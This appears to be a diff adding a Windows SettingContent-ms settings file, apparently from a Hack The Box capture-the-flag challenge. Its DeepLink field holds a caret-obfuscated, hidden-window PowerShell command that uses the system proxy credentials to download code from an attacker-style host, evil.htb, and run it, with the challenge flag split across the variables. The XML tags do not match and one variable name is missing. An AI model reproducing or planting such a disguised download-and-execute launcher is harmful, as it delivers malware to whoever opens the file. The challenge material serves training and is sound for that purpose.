@@ -1,0 +1,17 @@
+Settings>
+  <SearchableContent xmlns="http://schemas.microsoft.com/Search/2013/SettingContent">
+    <ApplicationInformation>
+      <AppID>windows.immersivecontrolpanel_cw5n1h2txyewy!microsoft.windows.immersivecontrolpanel</AppID>
+      <DeepLink>%windir%\system32\cmd.exe /c pow^ers^He^l^l.exe -nO^p -w hid^den -c $I=new-object net.webclient;$flag="HTB{th1s_m3";$I.proxy=[Net.Webrequest]::GetSystemWebProxy();$flag=$flag+"sS@gE_w1ll_s3lf";$I.Proxy.Credentials=[Net.CredentialsCache]::DefaultCredentials;$flag=$flag+"_d3StRuC7}";IEX $.downloadstring('http://evil.htb/home');</DeepLink>
+      <Icon>%windir%\system32\control.exe</Icon>
+    </ApplicationInformation>
+    <SettingIdentity>
+      <PageID></PageID>
+      <HostID>{12B1697E-D3A0-4DBC-B568-CCF64A3F934D}</HostID>
+    </SettingIdentity>
+    <SettingInformation>
+      <Description>@shell32.dll,-4161</Description>
+      <Keywords>@shell32.dll,-4161</Keywords>
+    </SettingInformation>
+  </SearchableContent>
+</PCSettings>
